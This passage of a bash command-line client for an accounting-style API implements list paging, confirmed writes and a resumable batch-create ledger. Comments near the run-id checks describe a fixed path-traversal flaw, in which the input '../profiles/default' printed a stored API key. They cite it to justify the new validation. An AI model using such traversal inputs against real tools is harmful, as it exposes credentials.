    *) die "usage: uku account <list|add|use|current|remove>" "$EX_USAGE" @@help.topic account ;;
  esac
}

# generic list helper: list_resource PATH COL...
list_resource() {
  local path="$1"; shift
  local -a cols=("$@")
  # --batch is a write flag; accepting it silently on a read would look like it
  # worked. parse_list_flags is shared, so the refusal belongs here.
  [ -z "${UKU_BATCH:-}" ] || die "--batch creates records — it does nothing on a list." "$EX_USAGE" @@help.batch
  load_creds; need_auth
  _apply_client_filter "$path"
  if [ "${UKU_ALL:-0}" = "1" ]; then
    # Degraded shape (fewer rows), not an unkept promise — see the
    # jq-degradation rule near have() — so warn and continue rather than refuse.
    have jq && { _list_all "$path" "${cols[@]}"; return; } || warn "--all needs jq to combine pages — showing the first page only."
  fi
  local q; q="$(build_query ${UKU_QUERY[@]+"${UKU_QUERY[@]}"})"
  do_request GET "$path$q"
  check_status "$REPLY_BODY"
  _verify_client_filter "$REPLY_BODY"
  _after_list "$path" "$REPLY_BODY"
  if [ "${#cols[@]}" -gt 0 ]; then table "$REPLY_BODY" "${cols[@]}"; else render "$REPLY_BODY"; fi
}

# --all: page through every row, KEEPING the user's filters (T1), streaming each
# page's .data[] to a tmp file (NDJSON), then slurp once. No growing argv.
_list_all() {
  local path="$1"; shift; local -a cols=("$@")
  # carry every user filter except limit/offset (we drive those ourselves)
  local -a filters=(); local kv
  for kv in ${UKU_QUERY[@]+"${UKU_QUERY[@]}"}; do
    case "$kv" in limit=*|offset=*) : ;; *) filters+=("$kv") ;; esac
  done
  local offset=0 page=200 total=0 more=1
  local acc; _mktemp acc
  while [ "$more" = "1" ]; do
    do_request GET "$path$(build_query limit=$page offset=$offset ${filters[@]+"${filters[@]}"})"
    check_status "$REPLY_BODY"
    _verify_client_filter "$REPLY_BODY"
    local got
    got="$(printf '%s' "$REPLY_BODY" | jq -r '.data[]? | @json' 2>/dev/null | tee -a "$acc" | wc -l | tr -d '[:space:]')"
    total="$(printf '%s' "$REPLY_BODY" | jq -r '.meta.total // 0' 2>/dev/null || echo 0)"
    offset=$(( offset + got ))
    { [ "${got:-0}" -ge 1 ] && [ "$offset" -lt "${total:-0}" ]; } && more=1 || more=0
  done
  local combined; combined="$(jq -c -s --argjson t "${total:-0}" '{data:., meta:{total:$t, limit:($t), offset:0, has_more:false}}' "$acc")"
  rm -f "$acc"
  _after_list "$path" "$combined"
  if [ "${#cols[@]}" -gt 0 ]; then table "$combined" "${cols[@]}"; else render "$combined"; fi
}

get_resource() {
  local path="$1"
  load_creds; need_auth
  do_request GET "$path"
  check_status "$REPLY_BODY"
  _after_get "$path" "$REPLY_BODY"
  render "$REPLY_BODY"
}

# write_resource METHOD PATH ACTION-LABEL — deliberate-gated write (needs --yes
# or a TTY confirm); the payload comes from --data (@file, @-, or literal JSON).
write_resource() {
  local method="$1" path="$2" label="$3"
  # ONE batch implementation, reached from the resource commands rather than
  # copied into each of them (tasks/time/clients create all land here). The
  # --client refusal comes AFTER, so a batch is told it is a batch.
  if [ -n "${UKU_BATCH:-}" ]; then run_batch "$method" "$path" "$label"; return; fi
  _reject_client_ref "a write"
  load_creds; need_auth
  if [ -z "${UKU_DATA:-}" ]; then
    local rescmd; rescmd="$(_res_cmd "$path")"
    local msg="$label needs a body: --data @file.json (or --data '{...}', or --data @-)"
    if [ -n "$rescmd" ]; then die "$msg" "$EX_USAGE" @@help.topic "$rescmd"; fi
    die "$msg" "$EX_USAGE" @@api.describe
  fi
  local payload; payload="$(read_data "$UKU_DATA")"
  _validate_json "$payload"
  confirm_write "$label"
  # AFTER the confirm, on purpose: a write refused for want of --yes must still
  # have sent nothing at all, and this probe is a request.
  _ref_probe_now
  do_request "$method" "$path" "$payload"
  check_status "$REPLY_BODY"
  _after_write "$method" "$path" "$REPLY_BODY"
  render "$REPLY_BODY"
}

# ── Bulk input (C3) ──────────────────────────────────────────────────
# Rain wrote this loop by hand four times in one day — four throwaway scripts,
# each re-implementing progress, resume-after-interruption and
# don't-create-it-twice. That logic belongs in the CLI. The API request count
# is unchanged; what changes is that nobody writes the loop again.
#
# The trustworthy part is the LEDGER, not the server. Before a line is sent its
# canonical content is hashed; the moment the server confirms the create, the
# hash + the new id are APPENDED to $UKU_CONFIG_HOME/batches/<run-id> — one
# open-write-close per line, so a Ctrl-C, a crash or a closed lid leaves a
# ledger that is complete up to the last record that actually landed. --resume
# then skips any line whose hash is already recorded. No server-side matching,
# no guessing about which record is "the same one".
#
# The ledger stores a HASH, never the line: this file lives in ~/.config/uku
# and client PII must not.
UKU_BATCH=""; UKU_RESUME=0; UKU_RUN_ID=""; UKU_STOP_ON_ERROR=0; UKU_SKIP_EXISTING=0; UKU_MATCH_ON=""; UKU_RETRY_UNKNOWN=0
UKU_BATCH_RUNNING=0; UKU_BATCH_RESUME_HINT=""; UKU_BATCH_DONE=0   # read by _on_signal

_batch_dir() { printf '%s/batches' "$UKU_CONFIG_HOME"; }

# Hashing: whatever the machine actually has. shasum ships with macOS and any
# perl install, sha256sum with coreutils; cksum is POSIX and present everywhere
# but is a 32-bit CRC — collisions are conceivable, so it is a last resort and
# says so out loud. With NONE of the three there is no honest idempotency, so
# the ledger is disabled: a batch still runs, --resume refuses rather than
# silently skipping (or re-creating) the wrong lines.
UKU_HASH_TOOL=""
_hash_tool() {
  if [ -z "$UKU_HASH_TOOL" ]; then
    if have shasum; then UKU_HASH_TOOL=shasum
    elif have sha256sum; then UKU_HASH_TOOL=sha256sum
    elif have cksum; then UKU_HASH_TOOL=cksum
    else UKU_HASH_TOOL=none; fi
  fi
  printf '%s' "$UKU_HASH_TOOL"
}
_hash() {  # stdin → a stable digest, or "" when nothing on this box can hash
  case "$(_hash_tool)" in
    shasum)    shasum -a 256 | awk '{print $1}' ;;
    sha256sum) sha256sum | awk '{print $1}' ;;
    cksum)     cksum | awk '{print $1 "-" $2}' ;;
    *)         cat >/dev/null 2>&1; printf '' ;;
  esac
}
# Canonical form so that whitespace and key ORDER don't make the same record
# look new on a resume. Without jq we can only trim: document that a re-ordered
# line then hashes differently and would be created again.
_canon_line() {
  local c
  if have jq && c="$(printf '%s' "$1" | jq -S -c . 2>/dev/null)"; then printf '%s' "$c"; else _trim "$1"; fi
}

# _json_str STRING — a JSON string literal without jq (results must stay
# machine-clean even on a box with no jq).
_json_str() {
  local s="$1"
  s="${s//\\/\\\\}"; s="${s//\"/\\\"}"
  s="${s//$'\n'/\\n}"; s="${s//$'\r'/\\r}"; s="${s//$'\t'/\\t}"
  printf '"%s"' "$s"
}

# ── the ledger ───────────────────────────────────────────────────────
# TSV, one record per line:  send|ok|fail <TAB> hash <TAB> path <TAB> id|status <TAB> iso8601 <TAB> lineno
#
# TWO phases, and the reason is the whole point of the feature. A `send` row is
# written BEFORE the request goes out, `ok` (with the new id) only after the
# server confirms. Kill a run and one line can be caught between the two: the
# POST reached the server but its reply never arrived. Measured, not imagined —
# a real Ctrl-C during a 10-line run left the server holding 4 records and the
# ledger holding 3.
#
# Recording only successes would make --resume re-create that line: an exact
# duplicate, in the one command whose entire promise is that it never does
# that. So a hash with `send` and no outcome is UNKNOWN, and --resume refuses to
# re-send it and says why. That is the same doctrine the CLI already applies to
# a 429 or a 5xx on a write: the outcome is unknown, so GET before resending.
#
# A `fail` row carrying an HTTP STATUS is the opposite case and must not be
# confused with it: a response came back, and it was not a success, so the
# server created nothing. Such a line is FAILED, not unknown, and plain
# --resume re-sends it — which is what the run's own summary tells the user to
# do. A `fail` row carrying a WORD (UNKNOWN_OUTCOME, GUARD_REFUSED, …) is a
# local refusal, never an observed outcome, so it decides nothing here.
# Backward compatible with ledgers written by v0.3.0: they hold the same rows,
# and one with no `fail` row at all still reads `send`-without-`ok` as UNKNOWN.
# A run-id names ONE file inside the batch directory; it is never a path. This
# guard is the last line, not the first — every caller validates too — but it
# is the one that cannot be bypassed by a new caller forgetting to. It shipped
# missing once: `uku batch show ../profiles/default` printed a live
# `UKU_KEY=uku_live_…` on stdout and exited 0, in v0.3.0, contradicting this
# file's own header, the surface note and the skill's "never print the key".
# The CLI now installs a skill telling agents to run `uku batch show <run-id>`
# from a breadcrumb, so an untrusted run-id is a real path into a transcript.
_ledger_file() {
  _valid_name "$1" || die "invalid run-id '$1' — a run-id names a ledger file (letters, digits, . _ -), never a path. Nothing was read." "$EX_USAGE" @@batch.list
  printf '%s/%s' "$(_batch_dir)" "$1"
}
_ledger_init() {  # RUNID METHOD PATH SOURCE
  local f; f="$(_ledger_file "$1")"
  mkdir -p "$(_batch_dir)" 2>/dev/null || return 0
  chmod 700 "$UKU_CONFIG_HOME" "$(_batch_dir)" 2>/dev/null || true
  if [ ! -f "$f" ]; then
    ( umask 077; { printf '# uku batch run\t%s\n' "$1"
                   printf '# target\t%s %s\n' "$2" "$3"
                   printf '# source\t%s\n' "$4"
                   printf '# account\t%s\n' "${UKU_PROFILE:-?}"
                   printf '# started\t%s\n' "$(_now_iso)"; } > "$f" )
  else
    ( umask 077; printf '# resumed\t%s\n' "$(_now_iso)" >> "$f" )
  fi
  chmod 600 "$f" 2>/dev/null || true
}
_now_iso() { date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || printf '-'; }
# _ledger_state RUNID HASH → "ok <id>" · "fail" · "send" · "" (never recorded).
# `ok` wins over everything whatever the order: a confirmed create is a fact.
# `fail` (an observed non-2xx) wins over `send`: the reply arrived, so the line
# is definitively not created, rather than unresolved.
_ledger_state() {
  local f; f="$(_ledger_file "$1")"
  [ -f "$f" ] || return 0
  [ -n "$2" ] || return 0
  awk -F'\t' -v h="$2" '
    $2==h && $1=="ok"   { id=$4; ok=1 }
    $2==h && $1=="send" { sent=1 }
    $2==h && $1=="fail" && $4 ~ /^[0-9]+$/ { rejected=1 }
    END { if (ok) printf "ok %s", id; else if (rejected) printf "fail"; else if (sent) printf "send" }' "$f" 2>/dev/null || true
}
# _ledger_add RUNID STATE HASH PATH ID_OR_STATUS LINENO — append AND flush.
# A separate open/write/close per line is the point: nothing is buffered, so an
# interruption can never lose a record for something the server already created.
_ledger_add() {
  local f; f="$(_ledger_file "$1")"
  [ -n "${3:-}" ] || return 0      # no hash (no hash tool) → nothing to resume on
  ( umask 077; printf '%s\t%s\t%s\t%s\t%s\t%s\n' "$2" "$3" "$4" "$5" "$(_now_iso)" "$6" >> "$f" ) 2>/dev/null || true
  return 0
}

# _batch_emit LINENO OUTCOME ID STATUS CODE MESSAGE PATH — one result object on
# STDOUT. stdout is the machine's channel: results only, one JSON object per
# input line. Every human word in a batch run goes to stderr.
_batch_emit() {
  if have jq; then
    jq -cn --argjson line "$1" --arg outcome "$2" --arg id "$3" --arg status "$4" \
           --arg code "$5" --arg message "$6" --arg path "$7" \
      '{line:$line, outcome:$outcome, path:$path,
        id:(if $id=="" then null else $id end),
        status:(if $status=="" then null else ($status|tonumber) end),
        code:(if $code=="" then null else $code end),
        message:(if $message=="" then null else $message end)}'
  else
    printf '{"line":%s,"outcome":%s,"path":%s,"id":%s,"status":%s,"code":%s,"message":%s}\n' \
      "$1" "$(_json_str "$2")" "$(_json_str "$7")" \
      "$([ -n "$3" ] && _json_str "$3" || printf 'null')" \
      "$([ -n "$4" ] && printf '%s' "$4" || printf 'null')" \
      "$([ -n "$5" ] && _json_str "$5" || printf 'null')" \
      "$([ -n "$6" ] && _json_str "$6" || printf 'null')"
  fi
}
_body_id()   { if have jq; then printf '%s' "$1" | jq -r '(.data.id // .id // empty) | tostring' 2>/dev/null || true
               else printf '%s' "$1" | grep -o '"id"[[:space:]]*:[[:space:]]*[0-9]*' | head -n1 | grep -o '[0-9]*$' || true; fi; }
_body_code() { if have jq; then printf '%s' "$1" | jq -r '.error.code // .code // empty' 2>/dev/null || true; fi; }
_body_msg()  { if have jq; then printf '%s' "$1" | jq -r '.error.message // .message // empty' 2>/dev/null || true
               else printf '%s' "$1" | tr '\n' ' ' | cut -c1-200; fi; }

# _batch_match_ids PATH FIELD VALUE — ids of existing records whose FIELD equals
# VALUE exactly. The server-side `q` is a fuzzy search, so it is used only to
# NARROW; the equality test is done here, on the field the user named.
_batch_match_ids() {
  local p="$1" fld="$2" val="$3"
  # UKU_DRY=0 deliberately: this is a READ, and it is the only way --dry-run can
  # honestly tell you which lines --skip-existing would skip. (do_request's own
  # --dry-run prints-and-exits, which inside this $( ) would just return nothing
  # and quietly report every line as creatable — the opposite of the truth.)
  _UKU_NO_HEAL=1 UKU_SOFT=1 UKU_DRY=0 do_request GET "$p$(build_query q="$val" limit=100)" || return 1
  case "$REPLY_STATUS" in 2*) : ;; *) return 1 ;; esac
  printf '%s' "$REPLY_BODY" | jq -r --arg f "$fld" --arg v "$val" \
    '.data[]? | select((.[$f] // empty | tostring) == $v) | .id' 2>/dev/null || true
}

# run_batch METHOD PATH LABEL — the one implementation every batching command
# routes through (write_resource, invoices create, uku api).
run_batch() {
  local method="$1" path="$2" label="$3"
  # Resolution costs an API call and is a judgement call about ONE record — a
  # batch line has neither. It carries its own fields and is never resolved.
  _reject_client_ref "a batch"
  case "$method" in
    POST) : ;;
    *) die "--batch creates records, so it only supports POST (got $method). Nothing was sent." "$EX_USAGE" @@help.batch ;;
  esac
  [ -z "${UKU_DATA:-}" ] || die "--batch and --data are alternatives — the batch file IS the data. Nothing was sent." "$EX_USAGE" @@help.batch
  [ "$UKU_SKIP_EXISTING" = "1" ] && [ -z "$UKU_MATCH_ON" ] && die "--skip-existing needs --match-on <field> — otherwise there is nothing to match on. Nothing was sent." "$EX_USAGE" @@help.batch
  [ -n "$UKU_MATCH_ON" ] && [ "$UKU_SKIP_EXISTING" != "1" ] && die "--match-on only means something with --skip-existing. Nothing was sent." "$EX_USAGE" @@help.batch
  if [ "$UKU_SKIP_EXISTING" = "1" ] && ! have jq; then
    # Unkeepable safety promise, not a mere shape change — see the
    # jq-degradation rule near have() — so refuse rather than guess.
    die "--skip-existing needs jq to compare a field exactly; without it the CLI would have to guess. Use the ledger instead (--resume). Nothing was sent." "$EX_USAGE" @@help.batch
  fi
  load_creds; need_auth

  # Materialise the input FIRST, into a 0600 temp file. Two reasons, both
  # load-bearing: (a) @- must be drained before the loop starts, and (b) `read`
  # in a loop that also runs curl is the classic bash trap — curl inherits
  # stdin and eats the rest of the file. The loop below reads from a dedicated
  # fd 3 so curl's stdin and the input can never be the same descriptor.
  local src="$UKU_BATCH" f
  _mktemp f; chmod 600 "$f" 2>/dev/null || true
  case "$src" in
    @-) cat > "$f" ;;
    @*) [ -f "${src#@}" ] || die "batch file not found: ${src#@}" "$EX_USAGE"; cat "${src#@}" > "$f" ;;
    *)  die "--batch wants a file: --batch @lines.jsonl  (or @- for stdin)" "$EX_USAGE" @@help.batch ;;
  esac
  # awk, not `wc -l`: a final line with no trailing newline still counts.
  local total; total="$(awk '!/^[[:space:]]*$/ && !/^[[:space:]]*#/ {n++} END{print n+0}' "$f" 2>/dev/null || printf '0')"
  [ "$total" -gt 0 ] || die "no JSON lines in $src (blank lines and # comments are skipped). Nothing was sent." "$EX_USAGE"

  # Run id: deterministic by default — target + a hash of the file — so
  # --resume works for someone who never wrote an id down.
  local rid="$UKU_RUN_ID" fh=""
  fh="$({ printf '%s %s\n' "$method" "$path"; cat "$f"; } | _hash)"
  if [ -z "$rid" ]; then
    [ -n "$fh" ] || die "no shasum/sha256sum/cksum on this system, so a run-id cannot be derived. Pass --run-id NAME (and note that --resume is unavailable without a hash tool)." "$EX_USAGE"
    local seg="${path##*/}"; seg="${seg%%\?*}"
    rid="$(printf '%s-%s' "$seg" "$(printf '%s' "$fh" | cut -c1-12)")"
  fi
  _valid_name "$rid" || die "invalid --run-id '$rid' (letters, digits, . _ -)" "$EX_USAGE"
  if [ "$UKU_RESUME" = "1" ] && [ "$(_hash_tool)" = "none" ]; then
    die "--resume needs a content hash and this system has no shasum/sha256sum/cksum. Refusing to guess which lines already landed. Nothing was sent." "$EX_USAGE" @@help.batch
  fi
  [ "$(_hash_tool)" = "cksum" ] && warn "hashing with cksum (a 32-bit CRC) — no shasum/sha256sum here. Resume is best-effort; two different lines could in principle collide."

  # How much of this file a previous run already created — worth saying before
  # the confirm, not after.
  local known=0
  if [ -f "$(_ledger_file "$rid")" ] && [ -n "$fh" ]; then
    known="$(awk -F'\t' '$1=="ok"{n++} END{print n+0}' "$(_ledger_file "$rid")" 2>/dev/null || printf '0')"
  fi

  # ONE confirm for the whole batch, naming the count and the target — not one
  # per line. --dry-run sends nothing, so it needs no confirmation.
  if [ "${UKU_DRY:-0}" != "1" ]; then
    confirm_write "$label — $total line(s) from $src → $method $path  ·  account '$UKU_PROFILE' ($UKU_COMPANY)$( [ "$UKU_RESUME" = "1" ] && printf ' · resuming %s' "$rid" || true)"
    _ledger_init "$rid" "$method" "$path" "$src"
  fi

  # Built before the loop, not after: the signal handler needs it (see _on_signal).
  # Rebuilt from the ORIGINAL argv so --base/--account survive; --dry-run is
  # dropped (a resume sends), and --resume/--yes are added exactly once.
  local resume_cmd; resume_cmd="uku"
  local a; for a in ${UKU_ARGV[@]+"${UKU_ARGV[@]}"}; do
    case "$a" in --resume|--dry-run|--yes|-y) continue ;; esac
    case "$a" in *[![:alnum:]@/._=-]*) resume_cmd="$resume_cmd '$(_sq "$a")'" ;; *) resume_cmd="$resume_cmd $a" ;; esac
  done
  resume_cmd="$resume_cmd --resume --yes"   # the run-id is derived from the file, so it needs no flag
  case "$src" in @-) resume_cmd="re-feed the same lines and add --resume  (stdin can't be replayed for you)" ;; esac
  if [ "${UKU_DRY:-0}" != "1" ]; then UKU_BATCH_RESUME_HINT="$resume_cmd"; UKU_BATCH_RUNNING=1; UKU_BATCH_DONE=0; fi

  local created=0 skipped=0 failed=0 lineno=0 stopped="" stop_rc="$EX_API" line=""
  printf '  %s\n' "$(_dim "batch $rid · $total line(s) → $method $path$( [ "$known" -gt 0 ] && printf ' · ledger already holds %s' "$known" || true )")" >&2

  exec 3< "$f"
  while IFS= read -r line <&3 || [ -n "$line" ]; do
    lineno=$((lineno + 1))
    local t; t="$(_trim "$line")"
    case "$t" in ''|'#'*) continue ;; esac

    # 1 — is it JSON at all? A bad line fails ITSELF and never aborts the run.
    local ok_json=1
    if have jq; then printf '%s' "$t" | jq -e 'type == "object"' >/dev/null 2>&1 || ok_json=0
    else case "$t" in '{'*'}') : ;; *) ok_json=0 ;; esac; fi
    if [ "$ok_json" = "0" ]; then
      failed=$((failed + 1))
      _batch_emit "$lineno" failed "" "" INVALID_JSON "line is not a JSON object — nothing sent" "$path"
      [ "${UKU_DRY:-0}" = "1" ] || _ledger_add "$rid" fail "$(printf '%s' "$t" | _hash)" "$path" INVALID_JSON "$lineno"
      if [ "$UKU_STOP_ON_ERROR" = "1" ]; then stopped="line $lineno failed (INVALID_JSON)"; break; fi
      continue
    fi

    local canon h state
    canon="$(_canon_line "$t")"; h="$(printf '%s' "$canon" | _hash)"
    state=""; [ -n "$h" ] && state="$(_ledger_state "$rid" "$h")"

    # 2 — the ledger. This is the idempotency that can be trusted.
    if [ "$UKU_RESUME" = "1" ] && [ -n "$state" ]; then
      case "$state" in
        ok\ *)
          skipped=$((skipped + 1))
          _batch_emit "$lineno" "$([ "${UKU_DRY:-0}" = "1" ] && printf 'would_skip' || printf 'skipped')" "${state#ok }" "" LEDGER_HIT "already created by run $rid" "$path"
          continue ;;
        fail)
          # The server answered and refused (422 / 500 / 412 …), so it created
          # nothing. Re-sending is the whole point of --resume here; falling
          # through does exactly that. Only an unobserved outcome is UNKNOWN.
          : ;;
        send)
          # Sent, never confirmed — the line the interruption caught in flight.
          if [ "$UKU_RETRY_UNKNOWN" != "1" ]; then
            failed=$((failed + 1))
            _batch_emit "$lineno" failed "" "" UNKNOWN_OUTCOME \
              "sent by run $rid but never confirmed (the run was interrupted mid-request) — it may or may not exist. Check the server, then re-send this line with --retry-unknown, or leave it. NOT re-sent: that could duplicate it." "$path"
            [ "${UKU_DRY:-0}" = "1" ] || _ledger_add "$rid" fail "$h" "$path" UNKNOWN_OUTCOME "$lineno"
            if [ "$UKU_STOP_ON_ERROR" = "1" ]; then stopped="line $lineno unresolved (UNKNOWN_OUTCOME)"; break; fi
            continue
          fi
          warn "line $lineno: re-sending a request whose outcome was unknown (--retry-unknown)." ;;
      esac
    fi

    # 3 — the same guard every single write gets (a time entry with a duration
    # and no end opens a timer). It dies; in a batch that must fail one line,
    # so run it where its exit and its message can be caught.
    local gmsg=""
    if ! gmsg="$( _guard_time_entry "$method" "$path" "$t" 2>&1 )"; then
      failed=$((failed + 1))
      _batch_emit "$lineno" failed "" "" GUARD_REFUSED "$(printf '%s' "$gmsg" | tr '\n' ' ' | tr -s ' ')" "$path"
      [ "${UKU_DRY:-0}" = "1" ] || _ledger_add "$rid" fail "$h" "$path" GUARD_REFUSED "$lineno"
      if [ "$UKU_STOP_ON_ERROR" = "1" ]; then stopped="line $lineno failed (GUARD_REFUSED)"; break; fi
      continue
    fi

    # 4 — --skip-existing: an explicit opt-in that asks the server first. See
    # `uku help batch` for why this is the fragile path and the ledger is not.
    if [ "$UKU_SKIP_EXISTING" = "1" ]; then
      local mval mids mcount
      mval="$(printf '%s' "$t" | jq -r --arg f "$UKU_MATCH_ON" '.[$f] // empty | tostring' 2>/dev/null || true)"
      if [ -z "$mval" ]; then
        failed=$((failed + 1))
        _batch_emit "$lineno" failed "" "" MATCH_FIELD_MISSING "line has no '$UKU_MATCH_ON' to match on — nothing sent" "$path"
        [ "${UKU_DRY:-0}" = "1" ] || _ledger_add "$rid" fail "$h" "$path" MATCH_FIELD_MISSING "$lineno"
        if [ "$UKU_STOP_ON_ERROR" = "1" ]; then stopped="line $lineno failed (MATCH_FIELD_MISSING)"; break; fi
        continue
      fi
      mids="$(_batch_match_ids "$path" "$UKU_MATCH_ON" "$mval" || true)"
      mcount="$(printf '%s' "$mids" | grep -c '[0-9]' || true)"; mcount="${mcount:-0}"
      if [ "$mcount" -gt 1 ]; then
        # REFUSE. In an accounting firm every client owns a task called
        # "Käibedeklaratsioon"; picking one of them would be picking wrong.
        # Measured on real data while building this: "Enter Payroll" matched
        # every row the query returned, and a title that looked unique in a
        # 200-row sample turned out to have 18 records.
        local shown howmany
        shown="$(printf '%s' "$mids" | head -n5 | tr '\n' ',' | sed 's/,$//')"
        [ "$mcount" -gt 5 ] && shown="$shown,… "
        # the match query is capped, so at the cap we only know a lower bound
        howmany="$mcount"; [ "$mcount" -ge 100 ] && howmany="at least $mcount"
        failed=$((failed + 1))
        _batch_emit "$lineno" failed "" "" AMBIGUOUS_MATCH \
          "$howmany existing records have $UKU_MATCH_ON='$mval' (ids: $shown) — refusing to guess which one this is. Nothing sent." "$path"
        [ "${UKU_DRY:-0}" = "1" ] || _ledger_add "$rid" fail "$h" "$path" AMBIGUOUS_MATCH "$lineno"
        if [ "$UKU_STOP_ON_ERROR" = "1" ]; then stopped="line $lineno failed (AMBIGUOUS_MATCH)"; break; fi
        continue
      elif [ "$mcount" = "1" ]; then
        skipped=$((skipped + 1))
        _batch_emit "$lineno" "$([ "${UKU_DRY:-0}" = "1" ] && printf 'would_skip' || printf 'skipped')" "$(printf '%s' "$mids" | tr -d '[:space:]')" "" MATCH_EXISTS "$UKU_MATCH_ON='$mval' already exists" "$path"
        continue
      fi
    fi

    # 5 — --dry-run stops here. do_request's own --dry-run exits the process
    # after ONE request, which would end the run at line 1; a batch dry-run has
    # to report every line, so it never enters do_request at all.
    if [ "${UKU_DRY:-0}" = "1" ]; then
      _batch_emit "$lineno" would_create "" "" "" "validated — nothing sent" "$path"
      created=$((created + 1))
      continue
    fi

    # 6 — rate limit. The write bucket is small (30/min on this account) and a
    # batch is exactly where that bites. do_request's _pace_write does the
    # waiting; the run only has to DECIDE whether the wait is longer than the
    # cap, and if so stop cleanly while the ledger is complete and resumable.
    local w; w="$(_rl_write_wait_secs)"
    if [ "$w" -gt "$UKU_RL_MAX_WAIT" ]; then
      stopped="write rate limit spent; it resets in ${w}s (at $(_rl_when "$(_rl_write_reset)")). Stopped before line $lineno — nothing was sent for it."
      stop_rc="$EX_NET"
      break
    fi

    # `send` BEFORE the wire, so an interruption between here and the reply is
    # recorded as unknown rather than as never-attempted (see the ledger note).
    _ledger_add "$rid" send "$h" "$path" - "$lineno"
    do_request "$method" "$path" "$t"
    case "$REPLY_STATUS" in
      2*)
        local nid; nid="$(_body_id "$REPLY_BODY")"
        # Ledger row FIRST, counter second. A signal is delivered between two
        # commands, and the live proof caught exactly that gap: the handler
        # reported "6 recorded" when the 6th ledger row had not been written
        # yet. The number a person is told must never be ahead of the file.
        _ledger_add "$rid" ok "$h" "$path" "${nid:-?}" "$lineno"
        created=$((created + 1)); UKU_BATCH_DONE="$created"
        _batch_emit "$lineno" created "$nid" "$REPLY_STATUS" "" "" "$path"
        ;;
      *)
        # 412 included, deliberately: a stale-write conflict is recorded as a
        # failed line and the run moves on. It is NEVER auto-retried — the
        # record changed under us and only a human can re-apply the change.
        failed=$((failed + 1))
        _ledger_add "$rid" fail "$h" "$path" "$REPLY_STATUS" "$lineno"
        _batch_emit "$lineno" failed "" "$REPLY_STATUS" "$(_body_code "$REPLY_BODY")" "$(_body_msg "$REPLY_BODY")" "$path"
        if [ "$UKU_STOP_ON_ERROR" = "1" ]; then stopped="line $lineno failed (HTTP $REPLY_STATUS)"; break; fi
        ;;
    esac
  done
  exec 3<&-
  UKU_BATCH_RUNNING=0

  # ── summary (stderr — stdout stayed machine-clean) ──
  {
    printf '\n'
    local verb="created" vskip="skipped"
    [ "${UKU_DRY:-0}" = "1" ] && { verb="would create"; vskip="would skip"; }
    printf '  %s\n' "$(_bold "batch $rid") — $(_green "$created $verb") · $skipped $vskip · $([ "$failed" -gt 0 ] && _red "$failed failed" || printf '%s' "0 failed")  (of $total line(s))"
    if [ "${UKU_DRY:-0}" = "1" ]; then
      printf '  %s\n' "$(_dim "--dry-run: nothing was sent, no ledger was written.")"
      [ "$known" -gt 0 ] && [ "$UKU_RESUME" != "1" ] && printf '  %s\n' "$(_dim "a ledger for $rid already holds $known created line(s) — add --resume to skip them")"
    else
      printf '  %s\n' "$(_dim "ledger: $(_ledger_file "$rid")")"
    fi
    if [ -n "$stopped" ]; then printf '  %s %s\n' "$(_color 33 '!')" "stopped: $stopped"; fi
    if [ "$failed" -gt 0 ] || [ -n "$stopped" ]; then
      # The remedy, in the same shape every other failure uses. A batch that
      # stopped or lost lines has exactly one sensible next command, and it is
      # this one — built from the caller's own argv, so it is theirs, not ours.
      _hint_line "$resume_cmd"
    fi
    printf '\n'
  } >&2

  # 5 only when the rate limit stopped us (a network-shaped, retry-later fact);
  # a --stop-on-error halt is an API failure, so it is 3.
  [ -n "$stopped" ] && exit "$stop_rc"
  [ "$failed" -gt 0 ] && exit "$EX_API"
  return 0
}

# uku batch list | show <run-id> — what a previous run actually did. Small on
# purpose: the ledger is a receipt, not a database.
cmd_batch() {
  local sub="${1:-list}"; shift || true
  local d; d="$(_batch_dir)"
  case "$sub" in
    list|ls)
      [ -d "$d" ] || { warn "no batch runs yet ($d)"; return 0; }
      local rows="" fpath name
      for fpath in "$d"/*; do
        [ -f "$fpath" ] || continue
        name="$(basename "$fpath")"
        rows="$rows$(awk -F'\t' -v n="$name" '
          $1=="# target"{t=$2} $1=="# started"{s=$2}
          $1=="ok"{c++} $1=="fail"{x++}
          END{printf "%s\t%d\t%d\t%s\t%s", n, c+0, x+0, (s?s:"-"), (t?t:"-")}' "$fpath")"$'\n'
      done
      [ -n "$rows" ] || { warn "no batch runs yet ($d)"; return 0; }
      if [ "${UKU_JSON:-0}" = "1" ] || ! _is_tty; then
        if have jq; then
          printf '%s' "$rows" | jq -R -s 'split("\n")|map(select(length>0))|map(split("\t")|{run_id:.[0],created:(.[1]|tonumber),failed:(.[2]|tonumber),started:.[3],target:.[4]})'
        else printf '%s' "$rows"; fi
      else
        { printf '%b\n' "$(_bold "RUN-ID\tCREATED\tFAILED\tSTARTED\tTARGET")"; printf '%s' "$rows"; } \
          | { have column && column -t -s "$(printf '\t')" || tr '\t' ' '; }
      fi
      ;;
    show)
      local rid="${1:-}"; [ -n "$rid" ] || die "usage: uku batch show <run-id>" "$EX_USAGE" @@batch.list
      # `run_batch` has always validated the run-id it derives or is given; this
      # path took the user's string straight to _ledger_file, so a run-id with a
      # `/` in it read (and printed) any file — `../profiles/default` is a
      # credential file. _ledger_file now refuses too; this check is here so the
      # refusal is a clean usage error rather than a swallowed one inside $( ).
      _valid_name "$rid" || die "invalid run-id '$rid' (letters, digits, . _ -). A run-id names a ledger under $(_batch_dir); it is never a path, and this command reads nothing else." "$EX_USAGE" @@batch.list
      local fpath; fpath="$(_ledger_file "$rid")"
      [ -f "$fpath" ] || die "no such batch run: $rid" "$EX_USAGE" @@batch.list
      cat "$fpath"
      ;;
    *) die "usage: uku batch <list|show <run-id>>" "$EX_USAGE" @@batch.list ;;
  esac
}

cmd_clients() {
  case "${1:-list}" in
    list) shift || true; parse_list_flags "$@"; list_resource /api/v3/clients id name status type ;;
    get)  [ -n "${2:-}" ] || die "usage: uku clients get <client_id|name|url>" "$EX_USAGE" @@help.topic clients; _resolve_ref clients "$2"; get_resource "/api/v3/clients/$UKU_REF_ID" ;;
    create) shift || true; parse_list_flags "$@"; write_resource POST /api/v3/clients "create a client" ;;
    patch)  [ -n "${2:-}" ] || die "usage: uku clients patch <id|name|url> --data @f" "$EX_USAGE" @@help.topic clients; _resolve_ref clients "$2" write; local id="$UKU_REF_ID"; shift 2; parse_list_flags "$@"; write_resource PATCH "/api/v3/clients/$id" "update client $id" ;;
    *) die "usage: uku clients <list|get|create|patch>" "$EX_USAGE" @@help.topic clients ;;
  esac
}
cmd_tasks() {
  case "${1:-list}" in
    list) shift || true; parse_list_flags "$@"; list_resource /api/v3/tasks id title status client_id ;;
